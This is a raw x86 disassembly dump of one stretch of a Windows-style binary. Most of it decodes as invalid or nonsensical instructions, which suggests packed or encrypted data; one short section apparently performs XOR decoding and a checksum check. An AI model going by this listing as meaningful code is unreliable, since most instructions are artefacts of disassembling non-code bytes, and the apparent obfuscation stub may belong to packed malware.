  40e543:	xchg   DWORD PTR [edx],esi
  40e545:	sbb    DWORD PTR [edx-0x1e],ecx
  40e548:	rcl    DWORD PTR [edx],cl
  40e54a:	scas   al,BYTE PTR es:[edi]
  40e54b:	add    ebp,DWORD PTR [edx]
  40e54d:	cmp    al,0xca
  40e54f:	les    ebp,FWORD PTR [eax+0x11aa7dc3]
  40e555:	pop    ecx
  40e556:	push   ecx
  40e557:	jb     0x40e524
  40e559:	add    al,0xc8
  40e55b:	xchg   edi,eax
  40e55c:	aad    0xb2
  40e55e:	sbb    DWORD PTR [edx],ecx
  40e560:	mov    ecx,0xf82f8213
  40e565:	push   ecx
  40e566:	jle    0x40e551
  40e568:	aaa    
  40e569:	outs   dx,BYTE PTR ds:[esi]
  40e56a:	cmc    
  40e56b:	adc    dl,BYTE PTR ds:0xc0a2b276
  40e571:	lea    edx,[esi+0x54]
  40e574:	test   DWORD PTR [esp+ebx*2-0x73],esi
  40e578:	xor    al,0x6e
  40e57a:	sub    eax,0x72900658
  40e57f:	out    0xb3,al
  40e581:	and    al,0xc4
  40e583:	push   esi
  40e584:	push   0xfffffff7
  40e586:	push   0x1e08a7e0
  40e58b:	mov    ebx,0xcb4c0c19
  40e590:	lahf   
  40e591:	shr    DWORD PTR [ebx+0x6e],cl
  40e594:	fmul   DWORD PTR [edx-0x3b]
  40e597:	mov    ecx,0x5fcfd586
  40e59c:	lds    edx,FWORD PTR [edx+0xf916d58]
  40e5a2:	dec    ebx
  40e5a3:	push   ss
  40e5a4:	sti    
  40e5a5:	xor    cl,BYTE PTR [edi+0x5a]
  40e5a8:	scas   al,BYTE PTR es:[edi]
  40e5a9:	popa   
  40e5aa:	mov    DWORD PTR [esi],eax
  40e5ac:	jb     0x40e5ad
  40e5ae:	or     ebp,ebx
  40e5b0:	fcmove st,st(1)
  40e5b2:	xchg   edi,eax
  40e5b3:	lahf   
  40e5b4:	push   esi
  40e5b5:	mov    cl,0xe8
  40e5b7:	loopne 0x40e5c2
  40e5b9:	cmp    DWORD PTR ds:0x642a74f0,esi
  40e5bf:	jb     0x40e602
  40e5c1:	xor    bh,BYTE PTR [edx+0x37]
  40e5c4:	cwde   
  40e5c5:	mov    ecx,DWORD PTR [edx-0x5b61b024]
  40e5cb:	loope  0x40e579
  40e5cd:	stos   DWORD PTR es:[edi],eax
  40e5ce:	pop    ecx
  40e5cf:	dec    ecx
  40e5d0:	fistp  WORD PTR ds:0xce821320
  40e5d6:	ss sbb ah,BYTE PTR ss:[eax+0x52]
  40e5db:	je     0x40e5e0
  40e5dd:	xor    eax,DWORD PTR [ebx-0x57]
  40e5e0:	(bad)  
  40e5e1:	(bad)  
  40e5e2:	pop    ds
  40e5e3:	lds    ecx,FWORD PTR [ebx]
  40e5e5:	das    
  40e5e6:	in     al,0x4d
  40e5e8:	test   DWORD PTR [ecx-0x76bd3e41],esi
  40e5ee:	mov    esp,0x92fe2977
  40e5f3:	int3   
  40e5f4:	mov    dl,0xbd
  40e5f6:	mov    ds:0x44038508,al
  40e5fb:	and    al,0x2e
  40e5fd:	sbb    DWORD PTR [edi-0x6e],ecx
  40e600:	or     ecx,DWORD PTR [eax+0x5f780e5]
  40e606:	add    eax,0x7e2bb73e
  40e60b:	push   ebx
  40e60c:	adc    BYTE PTR [esi-0x52],bl
  40e60f:	aas    
  40e610:	and    bl,cl
  40e612:	jns    0x40e62a
  40e614:	aaa    
  40e615:	gs cs xchg ebx,eax
  40e618:	xchg   edi,eax
  40e619:	ss jb  0x40e64c
  40e61c:	mov    al,0x8b
  40e61e:	push   ebp
  40e61f:	(bad)  
  40e620:	fidivr WORD PTR [edi]
  40e622:	shl    BYTE PTR [ecx+0x60c7d649],0xf6
  40e629:	lahf   
  40e62a:	adc    DWORD PTR [ebx+0x43a899fd],esp
  40e630:	aad    0x44
  40e632:	pop    edx
  40e633:	xor    bl,BYTE PTR [esp+0x7e78bab6]
  40e63a:	hlt    
  40e63b:	test   al,0x50
  40e63d:	arpl   WORD PTR [ebx],bx
  40e63f:	fstp   DWORD PTR [esi-0x60e8d3c5]
  40e645:	lods   al,BYTE PTR ds:[esi]
  40e646:	loopne 0x40e65f
  40e648:	dec    ebx
  40e649:	push   edi
  40e64a:	dec    esi
  40e64b:	xor    BYTE PTR [edi-0x3f],bh
  40e64e:	aaa    
  40e64f:	push   ebp
  40e650:	fstp   st(3)
  40e652:	addr16 fwait
  40e654:	jmp    0xdba7:0x98f3219e
  40e65b:	iret   
  40e65c:	out    0x52,al
  40e65e:	dec    esi
  40e65f:	xchg   edx,eax
  40e660:	sti    
  40e661:	mov    ebp,0xf37aacb
  40e666:	ret    
  40e667:	outs   dx,DWORD PTR ds:[esi]
  40e668:	outs   dx,BYTE PTR ds:[esi]
  40e669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e66a:	push   eax
  40e66b:	dec    eax
  40e66c:	mov    ?,WORD PTR [edx]
  40e66e:	add    eax,0x63f49dad
  40e673:	fucomip st,st(0)
  40e675:	mov    bh,0x9d
  40e677:	gs cmp BYTE PTR ds:[ebx+edx*8],cl
  40e67c:	call   0x4c3564cd
  40e681:	and    ebx,ebx
  40e683:	mov    cl,0x88
  40e685:	stos   DWORD PTR es:[edi],eax
  40e686:	(bad)  
  40e687:	cdq    
  40e688:	retf   0xc128
  40e68b:	and    DWORD PTR [eax],esp
  40e68d:	adc    DWORD PTR [ebx+0x1a1765c8],edi
  40e693:	jle    0x40e705
  40e695:	sbb    eax,0x58d2994d
  40e69a:	and    al,0x9a
  40e69c:	jp     0x40e6a1
  40e69e:	sub    DWORD PTR [eax-0x1f],esi
  40e6a1:	or     esi,DWORD PTR [ebp-0x12]
  40e6a4:	cli    
  40e6a5:	lods   al,BYTE PTR ds:[esi]
  40e6a6:	cmp    al,0xef
  40e6a8:	adc    al,0xb5
  40e6aa:	xor    eax,0xdb072345
  40e6af:	adc    BYTE PTR [ebp-0x288432ed],ah
  40e6b5:	dec    esi
  40e6b6:	jb     0x40e69f
  40e6b8:	or     ecx,ecx
  40e6ba:	and    al,0x4a
  40e6bc:	fld    DWORD PTR [ebp+0x4ef9263a]
  40e6c2:	jnp    0x40e6b2
  40e6c4:	or     al,0x4a
  40e6c6:	xor    dl,ch
  40e6c8:	int    0x3f
  40e6ca:	enter  0xda41,0x32
  40e6ce:	jno    0x40e6e2
  40e6d0:	paddsb mm4,mm7
  40e6d3:	icebp  
  40e6d4:	jo     0x40e6fe
  40e6d6:	push   es
  40e6d7:	dec    esi
  40e6d8:	and    ch,BYTE PTR [ebp+0x60441e97]
  40e6de:	jo     0x40e72d
  40e6e0:	xchg   edi,eax
  40e6e1:	shl    DWORD PTR [ebx],0x7b
  40e6e4:	js     0x40e71e
  40e6e6:	loop   0x40e73e
  40e6e8:	pop    ebp
  40e6e9:	lea    ebp,[esp+ebx*2+0x6]
  40e6ed:	fisubr WORD PTR [ecx]
  40e6ef:	out    dx,al
  40e6f0:	and    eax,0x1d08ac5d
  40e6f5:	and    dl,BYTE PTR [esi]
  40e6f7:	inc    edi
  40e6f8:	mov    esi,0x1df34585
  40e6fd:	lahf   
  40e6fe:	cmp    al,0xba
  40e700:	xchg   esi,eax
  40e701:	sbb    al,0x2a
  40e703:	mov    dh,0x2b
  40e705:	xor    al,0xfa
  40e707:	repnz mov cl,0x8b
  40e70a:	es repnz mov dl,0xa3
  40e70e:	cli    
  40e70f:	nop
  40e710:	bound  edx,QWORD PTR [eax]
  40e712:	test   eax,esp
  40e714:	mov    ds:0x41616c71,eax
  40e719:	out    dx,eax
  40e71a:	push   ebp
  40e71b:	add    esp,DWORD PTR [ebx]
  40e71d:	inc    esp
  40e71e:	les    esi,FWORD PTR [ecx+eax*1-0x3b6bebb1]
  40e725:	imul   ebp,edi,0x4a
  40e728:	xchg   esi,eax
  40e729:	inc    esp
  40e72a:	mov    ds:0xabe509a2,eax
  40e72f:	jae    0x40e799
  40e731:	mov    ebp,0x17570e56
  40e736:	add    al,0xca
  40e738:	dec    esp
  40e739:	fist   DWORD PTR [eax+0x60a62b3a]
  40e73f:	push   ebp
  40e740:	cwde   
  40e741:	xchg   ebp,eax
  40e742:	shl    DWORD PTR [edi+0x45],0xc7
  40e746:	cmp    ch,al
  40e748:	sub    cl,dh
  40e74a:	sub    bl,dh
  40e74c:	jnp    0x40e724
  40e74e:	push   esi
  40e74f:	push   edi
  40e750:	ins    DWORD PTR es:[edi],dx
  40e751:	fs xchg edx,eax
  40e753:	mov    ds:0x9390c010,eax
  40e758:	out    0x21,al
  40e75a:	aad    0x3f
  40e75c:	inc    ecx
  40e75d:	repz loop 0x40e7d9
  40e760:	pop    esi
  40e761:	mov    ds:0xc8c2c5c5,eax
  40e766:	aad    0x78
  40e768:	popa   
  40e769:	mov    ch,0x53
  40e76b:	data16 ja 0x40e6f2
  40e76e:	mov    BYTE PTR [ebx+ecx*1-0x6],ah
  40e772:	frstor [edi+0x50]
  40e775:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e776:	(bad)  [ebx+esi*2+0x22273fc]
  40e77d:	cld    
  40e77e:	(bad)  
  40e77f:	or     BYTE PTR [eax+esi*4],0x7
  40e783:	(bad)  
  40e784:	pop    edx
  40e785:	dec    eax
  40e786:	jne    0x40e73e
  40e788:	mov    edx,0xc2238fab
  40e78d:	in     eax,dx
  40e78e:	lds    edx,FWORD PTR [esi]
  40e790:	push   esp
  40e791:	push   edi
  40e792:	sbb    al,0xad
  40e794:	sbb    BYTE PTR [ecx],dh
  40e796:	pop    ecx
  40e797:	jo     0x40e7fe
  40e799:	scas   eax,DWORD PTR es:[edi]
  40e79a:	mov    al,0x33
  40e79c:	xor    eax,0xa8e7ab24
  40e7a1:	pop    ss
  40e7a2:	mov    esp,edx
  40e7a4:	(bad)  
  40e7a5:	mov    ch,0x29
  40e7a7:	sub    al,0x1
  40e7a9:	mov    esi,DWORD PTR [ebx]
  40e7ab:	and    al,0xd0
  40e7ad:	xchg   edx,eax
  40e7ae:	mov    edi,0x477ddbf0
  40e7b3:	xchg   ebx,eax
  40e7b4:	xchg   ebx,eax
  40e7b5:	or     al,0x28
  40e7b7:	cdq    
  40e7b8:	cmc    
  40e7b9:	fadd   DWORD PTR [eax+edi*2]
  40e7bc:	jmp    0x2cb7:0x3f10445f
  40e7c3:	and    DWORD PTR [edx+0x8],esi
  40e7c6:	xchg   ebx,eax
  40e7c7:	mov    ah,0x87
  40e7c9:	je     0x40e7f0
  40e7cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7cc:	fidivr DWORD PTR [ecx+0x38]
  40e7cf:	or     bh,BYTE PTR [edx-0x2f]
  40e7d2:	fsubr  DWORD PTR [edi-0x4b]
  40e7d5:	dec    esp
  40e7d6:	sti    
  40e7d7:	retf   0xec5f
  40e7da:	mov    ah,0xf3
  40e7dc:	jmp    0x74fa4f22
  40e7e1:	test   eax,0xef5bc9fe
  40e7e6:	xchg   BYTE PTR [esi-0x68],dh
  40e7e9:	(bad)  
  40e7ea:	and    ebx,DWORD PTR [ebx+0x36]
  40e7ed:	jae    0x40e7fc
  40e7ef:	jno    0x40e86e
  40e7f1:	mov    bl,0xcd
  40e7f3:	cmp    DWORD PTR [esi],ebx
  40e7f5:	cmp    BYTE PTR [edi+ebp*1],ah
  40e7f8:	xor    DWORD PTR [ecx-0x37f9e8fe],ecx
  40e7fe:	retf   
  40e7ff:	lahf   
  40e800:	fs push esp
  40e802:	and    al,0xf1
  40e804:	push   ecx
  40e805:	sub    BYTE PTR [ecx+0x666ca133],cl
  40e80b:	in     al,dx
  40e80c:	rcr    DWORD PTR [ebx+0x27],1
  40e80f:	dec    esp
  40e810:	test   BYTE PTR [ebx-0x35],bl
  40e813:	ret    0x745f
  40e816:	mov    al,ds:0x859e2714
  40e81b:	xor    ebx,DWORD PTR [esi+eiz*2]
  40e81e:	in     al,0xc4
  40e820:	shl    BYTE PTR [edi+0x5b],cl
  40e823:	ds out dx,eax
  40e825:	push   ecx
  40e826:	aad    0xbb
  40e828:	shl    BYTE PTR [esi-0x3572664d],1
  40e82e:	fidivr WORD PTR [eiz*1+0x7244b6af]
  40e835:	jge    0x40e874
  40e837:	lea    edx,[ecx+0x71]
  40e83a:	fdiv   QWORD PTR [ecx]
  40e83c:	push   esp
  40e83d:	ret    0xf21a
  40e840:	cmp    eax,0x85bdcc1e
  40e845:	adc    ah,al
  40e847:	mov    ch,0x64
  40e849:	pop    edi
  40e84a:	mov    ch,0x41
  40e84c:	mov    bh,0xaa
  40e84e:	enter  0xe29c,0x57
  40e852:	in     al,0xfb
  40e854:	push   edx
  40e855:	push   eax
  40e856:	dec    ebp
  40e857:	cmp    bl,bh
  40e859:	js     0x40e7e3
  40e85b:	jg     0x40e8c4
  40e85d:	scas   eax,DWORD PTR es:[edi]
  40e85e:	lds    edx,FWORD PTR [ebx]
  40e860:	(bad)  
  40e861:	lahf   
  40e862:	pushf  
  40e863:	or     bl,dl
  40e865:	jno    0x40e7f0
  40e867:	cmp    eax,0xa7e811e0
  40e86c:	xor    al,0x3e
  40e86e:	mov    dh,0xc
  40e870:	mov    WORD PTR es:[ebp+0x7a],fs
  40e874:	dec    esp
  40e875:	mov    ch,bh
  40e877:	pop    ecx
  40e878:	push   eax
  40e879:	xlat   BYTE PTR ds:[ebx]
  40e87a:	js     0x40e82b
  40e87c:	retf   
  40e87d:	mov    cx,0xb89d
  40e881:	pop    esp
  40e882:	es nop
  40e884:	adc    BYTE PTR [ebx+ebx*2+0x49],dl
  40e888:	test   DWORD PTR [edx+0x221835f9],edi
  40e88e:	add    eax,0x15e4991f
  40e893:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e894:	aaa    
  40e895:	and    eax,0xc74cc2ea
  40e89a:	cld    
  40e89b:	scas   al,BYTE PTR es:[edi]
  40e89c:	mov    ecx,DWORD PTR [ebp-0x20]
  40e89f:	mov    esi,DWORD PTR ds:0x434455
  40e8a5:	mov    esi,DWORD PTR [esi]
  40e8a7:	xor    DWORD PTR ds:0x43439e,esi
  40e8ad:	mov    esi,0x7510855
  40e8b2:	xor    DWORD PTR ds:0x4343a2,0x4326ec
  40e8bc:	xor    eax,esi
  40e8be:	add    eax,ebx
  40e8c0:	mov    DWORD PTR ds:0x432dc2,0x3895
  40e8ca:	cmp    ecx,eax
  40e8cc:	mov    DWORD PTR ds:0x434411,0xed9
  40e8d6:	je     0x40fd3a
  40e8dc:	push   DWORD PTR [ebp-0x20]
  40e8df:	adc    DWORD PTR ds:0x432dc2,0x4326f8
  40e8e9:	push   DWORD PTR [ebp+0x8]
  40e8ec:	call   0x404cd4
  40e8f1:	jmp    0x40ece5
  40e8f6:	ret    
  40e8f7:	rcr    BYTE PTR [ebp-0x67],1
  40e8fa:	popa   
  40e8fb:	cdq    
  40e8fc:	ret    
  40e8fd:	xor    WORD PTR [eax],0xffa7
  40e901:	fisubr DWORD PTR [eax+0x2b074b15]
  40e907:	call   0x7070:0x7d497070
  40e90e:	ins    BYTE PTR es:[edi],dx
  40e90f:	mov    ah,0xcf
  40e911:	cmp    bl,BYTE PTR [eax-0x64]
  40e914:	mov    ebp,0x8e9d0039
  40e919:	mov    edx,0x476f0b4a
  40e91e:	push   esp
  40e91f:	into   
  40e920:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e921:	loopne 0x40e904
  40e923:	lea    edx,[ebx-0x46]
  40e926:	call   0xe17d36ba
  40e92b:	lds    edi,FWORD PTR [eax]
  40e92d:	and    eax,0xac35b76b
  40e932:	cld    
  40e933:	mov    BYTE PTR [esp+esi*2-0x27ecd44b],bl
  40e93a:	mov    ah,BYTE PTR [eax]
  40e93c:	fst    st(1)
  40e93e:	jne    0x40e93e
  40e940:	mov    ds:0xdf07cb1e,eax
  40e945:	sbb    edi,esp
  40e947:	and    al,0x69
  40e949:	outs   dx,DWORD PTR ds:[esi]
  40e94a:	fucom  st(1)
  40e94c:	(bad)
  40e950:	hlt    
  40e951:	jae    0x40e915
  40e953:	das    
  40e954:	sbb    ecx,ebp
  40e956:	push   ss
  40e957:	je     0x40e972
  40e959:	lahf   
  40e95a:	jp     0x40e939
  40e95c:	xor    eax,0x3adf8137
  40e961:	push   eax
  40e962:	xchg   ecx,eax
  40e963:	cwde   
  40e964:	jnp    0x40e981
  40e966:	xchg   edi,eax
  40e968:	fadd   QWORD PTR ss:[ebx-0x3c]
  40e96c:	shr    ch,cl
  40e96e:	jmp    0x4c5fe8
  40e973:	sahf   
  40e974:	pop    ss
  40e975:	pop    edi
  40e976:	add    edi,DWORD PTR [eax]
  40e978:	sbb    al,dl
  40e97a:	sub    ebx,DWORD PTR [edx+0x4e]
  40e97d:	mov    edi,0x28fc7212
  40e982:	and    dh,bh
  40e984:	test   eax,0xbea361cb
  40e989:	inc    edi
  40e98a:	in     al,0xcd
  40e98c:	rcr    DWORD PTR [ecx-0x30],0xab
  40e990:	xchg   ebx,eax
  40e991:	cs mov cl,0xe1
  40e994:	pop    ds
  40e995:	jp     0x40ea0b
  40e997:	adc    BYTE PTR [edx+0x2a],cl
  40e99a:	lods   eax,DWORD PTR ds:[esi]
  40e99b:	xor    BYTE PTR [esi-0x8],ah
  40e99e:	pop    es
  40e99f:	xchg   BYTE PTR [edi-0x37],ch
  40e9a2:	pop    esi
  40e9a3:	push   ebx
  40e9a4:	jne    0x40e981
  40e9a6:	mov    eax,0x1e7ceb54
  40e9ab:	and    DWORD PTR [ecx],0x33124cf7
  40e9b1:	je     0x40e9df
  40e9b3:	in     al,0x1a
  40e9b5:	enter  0x9f12,0xf8
  40e9b9:	lock inc edx
  40e9bb:	ret    0xfd70
  40e9be:	push   ebx
  40e9bf:	test   DWORD PTR [edi],edi
  40e9c1:	sbb    al,0x1b
  40e9c3:	lds    edi,FWORD PTR [eax-0x26]
  40e9c6:	or     ecx,DWORD PTR [ebx-0x1d]
  40e9c9:	icebp  
  40e9ca:	push   0x1e
  40e9cc:	xor    al,BYTE PTR [esi+0x14b5fd77]
  40e9d2:	rol    BYTE PTR [esi+0x7c81f933],0x28
  40e9d9:	fldcw  WORD PTR [ebp+0x9]
  40e9dc:	mov    ds:0xa98f17ea,al
  40e9e1:	and    eax,0x9cdf284a
  40e9e6:	int    0x8a
  40e9e8:	and    edx,edx
  40e9ea:	xor    ah,BYTE PTR [edi]
  40e9ec:	xabort 0xaa
  40e9ef:	xor    bl,cl
  40e9f1:	dec    eax
  40e9f2:	and    eax,ebp
  40e9f4:	or     ah,BYTE PTR [ecx-0x79305579]
  40e9fa:	outs   dx,DWORD PTR ds:[esi]
  40e9fb:	test   DWORD PTR [edx+0x71],eax
  40e9fe:	jb     0x40e9dd
  40ea00:	jl     0x40e9cc
  40ea02:	jmp    0x40ea18
  40ea04:	sbb    BYTE PTR [edi],dl
  40ea06:	in     eax,0xbf
  40ea08:	enter  0x162e,0x35
  40ea0c:	outs   dx,BYTE PTR ds:[esi]
  40ea0d:	popa   
  40ea0e:	(bad)
  40ea12:	lds    edx,FWORD PTR [ecx-0x9]
  40ea15:	mov    cl,0x7d
  40ea17:	mov    ah,0x97
  40ea19:	push   ss
  40ea1a:	jmp    0x5726:0xb1289c91
  40ea21:	mov    ebp,DWORD PTR [ecx+0x1b1fecce]
  40ea27:	push   0x7a
  40ea29:	xchg   ecx,eax
  40ea2a:	fs hlt 
  40ea2c:	cdq    
  40ea2d:	mov    edx,0xcb245619
  40ea32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea33:	jecxz  0x40ea08
  40ea35:	out    dx,al
  40ea36:	inc    ecx
  40ea37:	xor    eax,DWORD PTR [esi]
  40ea39:	or     DWORD PTR [edi+0x7435fc41],ebp
  40ea3f:	(bad)  
  40ea40:	pushf  
  40ea41:	sub    ebx,DWORD PTR [ecx-0x2c]
  40ea44:	and    eax,0x576f6df9
  40ea49:	push   eax
  40ea4a:	push   es
  40ea4b:	pop    eax
  40ea4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea4d:	sub    bl,BYTE PTR [eax+0x6a756bdf]
  40ea53:	(bad)
  40ea56:	clc    
  40ea57:	inc    ecx
  40ea58:	xchg   edx,eax
  40ea59:	loope  0x40ea43
  40ea5b:	mov    cl,0x74
  40ea5d:	push   ds
  40ea5e:	sahf   
  40ea5f:	jnp    0x40ea33
  40ea61:	or     al,0xcc
  40ea63:	sahf   
  40ea64:	xor    al,0x60
  40ea66:	push   ecx
  40ea67:	(bad)  
  40ea68:	adc    ah,bh
  40ea6a:	xchg   esi,eax
  40ea6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea6c:	dec    edi
  40ea6d:	std    
  40ea6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea6f:	cmp    eax,0x2a070467
  40ea74:	aas    
  40ea75:	hlt    
  40ea76:	test   BYTE PTR [edi+0x5a],al
  40ea79:	mov    edi,0xa1c0c575
  40ea7e:	lods   al,BYTE PTR ds:[esi]
  40ea7f:	and    DWORD PTR [edi-0x5d],edi
  40ea82:	leave  
  40ea83:	jmp    0xdb39:0x5c0ba581
  40ea8a:	add    eax,0xb0ea5f5b
  40ea8f:	loope  0x40ea9d
  40ea91:	pop    cx
  40ea93:	inc    esi
  40ea94:	mov    al,0xf5
  40ea96:	xchg   edi,eax
  40ea97:	mov    al,0x7
  40ea99:	mov    eax,ds:0x511226bf
  40ea9e:	(bad)  
  40ea9f:	ret    
  40eaa0:	lock push es
  40eaa2:	mov    edi,0x9b4a641a
  40eaa7:	and    eax,0xb5e0fe1c
  40eaac:	adc    bl,cl
  40eaae:	ret    0x762e
  40eab1:	js     0x40eae5
  40eab3:	nop
  40eab4:	pusha  
  40eab5:	sub    eax,0xcc139265
  40eaba:	pushf  
  40eabb:	rcl    BYTE PTR [ebx+0x561ffc2],cl
  40eac1:	pop    edx
  40eac2:	daa    
  40eac3:	xor    DWORD PTR ds:0xe2ace340,0xd0551b2a
  40eacd:	xlat   BYTE PTR ds:[ebx]
  40eace:	mov    ah,BYTE PTR [ecx+0x69a5ac82]
  40ead4:	mov    esi,DWORD PTR [ebx+0xc]
  40ead7:	inc    edi
  40ead8:	ins    BYTE PTR es:[edi],dx
  40ead9:	out    0xf0,al
  40eadb:	lds    eax,FWORD PTR [ebp-0x1f]
  40eade:	xor    edx,DWORD PTR [edi-0x2c43495b]
  40eae4:	push   es
  40eae5:	xchg   ecx,eax
  40eae6:	sub    dl,ah
  40eae8:	iret   
  40eae9:	xchg   edx,eax
  40eaea:	int    0x4e
  40eaec:	(bad)  
  40eaee:	xlat   BYTE PTR ds:[ebx]
  40eaef:	xor    BYTE PTR [edi],dh
  40eaf1:	xchg   ecx,eax
  40eaf2:	push   esp
  40eaf3:	add    edi,edi
  40eaf5:	xchg   BYTE PTR [ebx],ch
  40eaf7:	sahf   
  40eaf8:	pusha  
  40eaf9:	or     eax,0x701c10bf
  40eafe:	cli    
  40eaff:	aaa    
  40eb00:	dec    edx
  40eb01:	sbb    eax,0xe6a8aab1
  40eb06:	pop    edi
  40eb07:	xchg   ebp,eax
  40eb08:	(bad)  
  40eb09:	cdq    
  40eb0a:	and    al,0x50
  40eb0c:	outs   dx,DWORD PTR ds:[esi]
  40eb0d:	mov    BYTE PTR [ebx+0x51],cl
  40eb10:	ds jo  0x40eb47
  40eb13:	gs (bad) 
  40eb15:	adc    al,0xdc
  40eb17:	mov    ss,WORD PTR [edx-0x295c6b26]
  40eb1d:	inc    ebp
  40eb1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb1f:	xor    eax,DWORD PTR [ebx]
  40eb21:	push   ss
  40eb22:	scas   eax,DWORD PTR es:[edi]
  40eb23:	test   al,0x28
  40eb26:	sbb    edx,edi
  40eb28:	push   0x2d
  40eb2a:	iret   
  40eb2b:	pop    eax
  40eb2c:	ss inc edx
  40eb2e:	lds    ecx,FWORD PTR es:[edi]
  40eb31:	(bad)  [esi-0x46]
  40eb34:	rol    al,cl
  40eb36:	scas   eax,DWORD PTR es:[edi]
  40eb37:	imul   DWORD PTR [eax-0x65c6ce07]
  40eb3d:	out    dx,al
  40eb3e:	sbb    eax,0x1a79f12c
  40eb43:	dec    edi
  40eb44:	jae    0x40eb06
  40eb46:	test   BYTE PTR [edx+0x75],cl
  40eb49:	adc    cl,BYTE PTR [ecx]
  40eb4b:	(bad)  
  40eb4c:	fisub  WORD PTR [ebx]
  40eb4e:	enter  0x26bb,0xf
  40eb52:	jno    0x40eb67
  40eb54:	out    0x62,eax
  40eb56:	xchg   DWORD PTR [edi],edx
  40eb58:	loope  0x40eaeb
  40eb5a:	cmp    DWORD PTR [esi],edi
  40eb5c:	xchg   edi,eax
  40eb5d:	xor    BYTE PTR [ecx],al
  40eb5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb60:	pop    eax
  40eb61:	in     eax,dx
  40eb62:	and    al,0xcb
  40eb64:	push   esp
  40eb65:	test   BYTE PTR [eax-0x60],bh
  40eb68:	and    BYTE PTR [edi+ecx*4],dl
  40eb6b:	mov    ch,dl
  40eb6d:	enter  0x61ad,0xa1
  40eb71:	cdq    
  40eb72:	sub    ch,BYTE PTR [edi+0x259be6b]
  40eb78:	out    dx,eax
  40eb79:	int3   
  40eb7a:	mov    esp,0x9d8b79fe
  40eb7f:	xchg   edx,eax
  40eb80:	mov    ds:0x650ce0f8,al
  40eb85:	jmp    0x40ebe4
  40eb87:	loope  0x40eb9d
  40eb89:	sar    BYTE PTR [esi+ebp*4-0x5b],cl
  40eb8d:	cmp    eax,0xbd65744a
  40eb92:	mov    bh,0xa9
  40eb94:	cmp    DWORD PTR [edx],ecx
  40eb96:	stos   DWORD PTR es:[edi],eax
  40eb97:	sbb    al,0x2b
  40eb99:	stos   BYTE PTR es:[edi],al
  40eb9a:	adc    DWORD PTR [ebp+0x19c4796f],ebp
  40eba0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eba1:	pop    esp
  40eba2:	jmp    0xc7131e06
  40eba7:	inc    ebx
  40eba8:	sub    DWORD PTR [edx+0x6b],ebx
  40ebab:	(bad)  
  40ebac:	mov    ah,0xb
  40ebae:	mov    esi,0x8e998102
  40ebb3:	xchg   ebx,eax
  40ebb4:	inc    eax
  40ebb5:	inc    ebp
  40ebb6:	xchg   ebp,eax
  40ebb7:	jo     0x40eb5a
  40ebb9:	push   esi
  40ebba:	or     esi,esp
  40ebbc:	ins    BYTE PTR es:[edi],dx
  40ebbd:	xchg   esp,eax
  40ebbe:	lds    ebp,FWORD PTR [eax+0x7902c2fb]
  40ebc4:	inc    esp
  40ebc5:	jne    0x40ebc6
  40ebc7:	sbb    eax,0xfe4bf26a
  40ebcc:	mov    al,ds:0x3a501dc4
  40ebd1:	mov    al,0xb1
  40ebd3:	push   es
  40ebd4:	xor    al,ah
  40ebd6:	out    0xce,eax
  40ebd8:	add    al,0xe6
  40ebda:	or     DWORD PTR [edx+0x21],0x4c
  40ebde:	dec    edi
  40ebdf:	popf   
  40ebe0:	adc    BYTE PTR [ecx-0x6ed72c82],dh
  40ebe6:	adc    esp,DWORD PTR [edi+0x608677d1]
  40ebec:	nop
  40ebed:	mov    ah,0x6d
  40ebef:	cmp    ecx,ecx
  40ebf1:	daa    
  40ebf2:	out    0x65,eax
  40ebf4:	xchg   ebx,eax
  40ebf5:	or     bl,0xb
  40ebf8:	aad    0xbb
  40ebfa:	outs   dx,BYTE PTR ds:[esi]
  40ebfb:	push   ecx
  40ebfc:	aam    0x98
  40ebfe:	jo     0x40ec59
  40ec00:	frstor [ebx+0x7ec9218]
  40ec06:	rol    DWORD PTR [ebp-0x13],1
  40ec09:	xor    al,0xc0
  40ec0b:	fs pop edx
  40ec0d:	mov    DWORD PTR [ebx+0x5],eax
  40ec10:	aad    0x4e
  40ec12:	fwait
  40ec13:	test   ebp,eax
  40ec15:	mov    ?,WORD PTR [ecx+0x4f]
  40ec18:	mov    eax,0xbcbdf942
  40ec1e:	pop    edx
  40ec1f:	pop    ebp
  40ec20:	jmp    0xd3d4:0x286b063a
  40ec27:	stc    
  40ec28:	scas   eax,DWORD PTR es:[edi]
  40ec29:	xor    DWORD PTR [eax-0x66],ebx
  40ec2c:	(bad)  
  40ec2d:	cli    
  40ec2e:	mov    dh,0xc7
  40ec30:	mov    ch,0xca
  40ec32:	lea    esi,[ebp+0x183d04fb]
  40ec38:	test   eax,esi
  40ec3a:	mov    DWORD PTR [esi*4+0x35166d96],ebp
  40ec41:	mov    edx,0x20503192
  40ec46:	std    
  40ec47:	xchg   DWORD PTR [ebx],edx
  40ec49:	jecxz  0x40ec3b
  40ec4b:	icebp  
  40ec4c:	and    eax,0x6dec3177
  40ec51:	lea    ebp,[esi+0xe715ac3]
  40ec57:	shr    DWORD PTR [edi-0x34],cl
  40ec5a:	shr    BYTE PTR [eax+eax*2],cl
  40ec5d:	jmp    0x40ebf4
  40ec5f:	or     BYTE PTR [ebp+0x42b5b33d],cl
  40ec65:	sub    al,0xa2
  40ec67:	cli    
  40ec68:	aad    0x4
  40ec6a:	imul   esp,DWORD PTR [eax],0xffffffc4
  40ec6d:	in     eax,0xf7
  40ec6f:	push   ebp
  40ec70:	add    DWORD PTR [edi],ecx
  40ec72:	retf   
  40ec73:	pop    es
  40ec74:	aam    0x8f
  40ec76:	mov    eax,0xec95daa9
  40ec7b:	inc    esi
  40ec7d:	enter  0xefee,0xf3
  40ec81:	nop
  40ec82:	mov    DWORD PTR [edx-0x47],ebx
  40ec85:	sbb    BYTE PTR [ebx-0x20],dl
  40ec88:	neg    dh
  40ec8a:	sbb    al,0x63
  40ec8c:	mov    ah,0x7b
